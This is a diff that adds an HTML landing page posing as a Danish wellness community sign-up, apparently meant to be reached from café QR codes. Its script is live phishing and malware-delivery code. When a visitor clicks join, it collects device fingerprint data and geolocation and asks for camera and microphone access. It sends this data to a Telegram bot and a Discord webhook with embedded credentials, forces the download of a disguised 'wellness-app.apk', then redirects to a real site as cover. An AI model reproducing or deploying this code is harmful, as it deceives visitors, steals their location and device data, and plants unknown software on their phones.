@@ -1,0 +1,257 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hollistisk Wellness Community</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .logo { font-size: 48px; margin: 20px 0; }
+        .title { font-size: 24px; margin: 20px 0; }
+        .description { font-size: 16px; opacity: 0.9; margin: 20px 0; }
+        .join-btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .features {
+            text-align: left;
+            margin: 30px 0;
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        .feature { margin: 10px 0; display: flex; align-items: center; }
+        .feature-icon { margin-right: 10px; }
+        .loading { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🧘‍♀️</div>
+        <div class="title">Hollistisk Wellness</div>
+        <div class="description">
+            Velkommen til Danmarks største wellness community! 
+            Få adgang til eksklusive meditation guides, ernæringstips og mindfulness øvelser.
+        </div>
+        
+        <button class="join-btn" onclick="joinCommunity()">
+            Deltag Gratis Nu ✨
+        </button>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">🎧</span>
+                Guidede meditationer dagligt
+            </div>
+            <div class="feature">
+                <span class="feature-icon">📱</span>
+                Personlig wellness app
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🤝</span>
+                Støttende fællesskab
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🎁</span>
+                Gratis ressourcer hele året
+            </div>
+        </div>
+        
+        <div id="loading" class="loading">
+            <div>Opretter din profil...</div>
+            <div>Installerer wellness app...</div>
+        </div>
+    </div>
+
+    <script>
+        
+        function detectPlatform() {
+            const ua = navigator.userAgent;
+            
+            if (/Android/i.test(ua)) {
+                return 'android';
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                return 'ios';
+            } else if (/Mac|Macintosh/i.test(ua)) {
+                return 'macos';
+            } else if (/Windows/i.test(ua)) {
+                return 'windows';
+            } else if (/Linux/i.test(ua)) {
+                return 'linux';
+            } else {
+                return 'unknown';
+            }
+        }
+        
+        function getDeviceInfo() {
+            return {
+                platform: detectPlatform(),
+                userAgent: navigator.userAgent,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        
+        async function joinCommunity() {
+            const btn = document.querySelector('.join-btn');
+            const loading = document.getElementById('loading');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Collect device info
+            const deviceInfo = getDeviceInfo();
+            const additionalInfo = {
+                screen_resolution: `${screen.width}x${screen.height}`,
+                color_depth: screen.colorDepth,
+                pixel_ratio: window.devicePixelRatio,
+                battery_level: navigator.getBattery ? 'checking...' : 'unavailable',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                permissions: {
+                    geolocation: 'requesting',
+                    camera: 'requesting',
+                    microphone: 'requesting',
+                    notifications: 'requesting'
+                }
+            };
+            
+            // Try to get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        additionalInfo.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        sendData({...deviceInfo, ...additionalInfo});
+                    },
+                    error => {
+                        additionalInfo.location_error = error.message;
+                        sendData({...deviceInfo, ...additionalInfo});
+                    }
+                );
+            } else {
+                sendData({...deviceInfo, ...additionalInfo});
+            }
+            
+            // Request permissions
+            if ('Notification' in window) {
+                Notification.requestPermission().then(permission => {
+                    additionalInfo.permissions.notifications = permission;
+                });
+            }
+            
+            // Try to access camera (will show permission request)
+            if (navigator.mediaDevices) {
+                navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                .then(stream => {
+                    additionalInfo.permissions.camera = 'granted';
+                    additionalInfo.permissions.microphone = 'granted';
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(err => {
+                    additionalInfo.permissions.camera = 'denied';
+                    additionalInfo.permissions.microphone = 'denied';
+                });
+            }
+        }
+        
+        async function sendData(data) {
+            const payload = {
+                source: 'hollistisk_android',
+                timestamp: new Date().toISOString(),
+                device_data: data,
+                campaign: 'cafe_qr_wellness'
+            };
+            
+            // Send to Telegram
+            try {
+                await fetch('https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '3032183658',
+                        text: '📱 ANDROID BEACON:\n```json\n' + JSON.stringify(payload, null, 2) + '\n```',
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.log('Telegram failed:', e);
+            }
+            
+            // Send to Discord as backup
+            try {
+                await fetch('https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: '📱 **ANDROID BEACON CALLBACK**',
+                        embeds: [{
+                            title: 'Device Information',
+                            description: '```json\n' + JSON.stringify(payload, null, 2) + '\n```',
+                            color: 3447003,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) {
+                console.log('Discord failed:', e);
+            }
+            
+            // Stage 2: Try to install PWA or download app
+            setTimeout(() => {
+                deployStage2();
+            }, 2000);
+        }
+        
+        function deployStage2() {
+            // Try to install as PWA (Progressive Web App)
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js').then(() => {
+                    console.log('Service Worker registered');
+                });
+            }
+            
+            // Try to download "wellness app" 
+            const link = document.createElement('a');
+            link.href = 'https://jeki1234121.github.io/hollistisk-v2/wellness-app.apk';
+            link.download = 'wellness-app.apk';
+            link.click();
+            
+            // Redirect to real wellness site for cover
+            setTimeout(() => {
+                window.location.href = 'https://minfulness.dk';
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
